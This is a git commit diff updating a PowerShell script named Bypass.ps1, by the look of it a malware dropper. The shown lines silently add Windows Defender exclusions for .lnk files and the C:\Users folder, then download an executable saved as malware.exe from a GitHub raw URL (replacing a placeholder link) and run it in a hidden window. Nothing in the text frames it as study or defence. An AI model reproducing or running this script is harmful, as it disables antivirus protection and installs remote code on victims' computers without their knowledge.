d740a7d2ac7d4ee1c18e21234e108b5952c7c34c
safeer666 <aliabbasiso811314@gmail.com>
2024-09-02 12:40:09 +0500

    Update Bypass.ps1

--- Bypass.ps1
+++ Bypass.ps1
@@ -4,6 +4,6 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://your-direct-downloading-link -o C:\Users\malware.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://raw.githubusercontent.com/safeer666/powershell1/main/tow.exe -o C:\Users\malware.exe
 powershell.exe -w Hidden C:\Users\malware.exe
 
